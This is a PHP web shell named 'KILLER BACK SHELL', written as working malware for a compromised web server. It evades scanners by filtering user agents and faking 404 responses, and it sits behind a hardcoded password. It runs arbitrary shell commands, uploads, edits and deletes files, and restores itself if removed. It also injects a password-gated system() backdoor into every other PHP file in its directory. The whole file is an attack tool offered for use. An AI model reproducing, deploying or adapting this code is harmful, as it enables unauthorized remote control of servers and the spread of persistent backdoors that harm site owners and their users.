<?php
/**
 * 👻 KILLER BACK SHELL - FINAL EDITION
 * Anti-Detect | Anti-Delete | Ninja Mode | Full File Manager
 */

// 🧪 CONFIG
$pass = "g1lagw"; // Ganti password login
$self = __FILE__;
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

// 🕳️ ANTI BOT / CRAWLER
if (preg_match('/(bot|crawl|scan|spider|curl|wget|http|python|nikto|masscan|sqlmap|nmap)/i', $ua)) {
    header('HTTP/1.0 404 Not Found'); exit;
}

// 🫥 FAKE 404 RESPONSE
header("HTTP/1.0 404 Not Found");
echo "<!-- File not found -->";

// 🔐 LOGIN
session_start();
if (!isset($_SESSION['ok'])) {
    if (isset($_POST['p']) && $_POST['p'] === $pass) {
        $_SESSION['ok'] = true;
    } else {
        echo '<form method="POST"><input type="password" name="p" placeholder="Password"><input type="submit" value="Login"></form>';
        exit;
    }
}

// 🔁 SELF HEAL + AUTOINJECT
$payload = <<<'PAYLOAD'
<?php
// ghost_signature
if(isset($_REQUEST['cmd']) && $_REQUEST['auth'] === 'g1lagw') {
    echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>";
}
?>
PAYLOAD;

register_shutdown_function(function() use ($self, $payload) {
    if (!file_exists($self)) {
        file_put_contents($self, $payload);
    } else {
        $code = file_get_contents($self);
        if (strpos($code, 'ghost_signature') === false) {
            file_put_contents($self, $code . "\n" . $payload);
        }
    }

    foreach (glob("*.php") as $f) {
        if ($f !== basename($self)) {
            $c = @file_get_contents($f);
            if ($c && strpos($c, 'ghost_signature') === false) {
                @file_put_contents($f, "\n" . $payload, FILE_APPEND);
            }
        }
    }
});

// 🧼 GUI MODE - CLEAN & DARK
echo "<style>
body{background:#000;color:#0f0;font-family:monospace}
input,textarea,select{background:#111;color:#0f0;border:1px solid #0f0;padding:3px}
</style><h1>KILLER FILE MANAGER 🪓</h1><hr><b>DIR:</b> ".getcwd()."<br>";

// 📂 FILE LIST
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file' name='f'><input type='submit' value='Upload'></form><br>";

if(isset($_FILES['f'])) {
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
    echo "✅ Uploaded: ".$_FILES['f']['name']."<br>";
}

if(isset($_POST['cmd'])) {
    echo "<pre>"; system($_POST['cmd']); echo "</pre>";
}

echo "<form method='POST'><input name='cmd' placeholder='Command'><input type='submit' value='Run'></form>";

echo "<table border=1 cellpadding=5>";
foreach (scandir(".") as $f) {
    if ($f === ".") continue;
    $size = filesize($f);
    $mtime = date("Y-m-d H:i:s", filemtime($f));
    echo "<tr><td>$f</td><td>$size</td><td>$mtime</td><td>
    <form method='POST' style='display:inline'>
        <input type='hidden' name='view' value='$f'><input type='submit' value='View'>
    </form>
    <form method='POST' style='display:inline'>
        <input type='hidden' name='del' value='$f'><input type='submit' value='Del'>
    </form></td></tr>";
}
echo "</table>";

// VIEW / EDIT
if (isset($_POST['view'])) {
    $fc = htmlentities(file_get_contents($_POST['view']));
    echo "<h3>Edit: {$_POST['view']}</h3>
    <form method='POST'>
    <textarea name='data' rows='15' cols='80'>{$fc}</textarea>
    <input type='hidden' name='file' value='{$_POST['view']}'><br>
    <input type='submit' value='Save'></form>";
}

if (isset($_POST['data']) && isset($_POST['file'])) {
    file_put_contents($_POST['file'], $_POST['data']);
    echo "💾 Saved!";
}

// DELETE
if (isset($_POST['del'])) {
    unlink($_POST['del']);
    echo "🗑️ Deleted: ".$_POST['del']."<br>";
}
?>
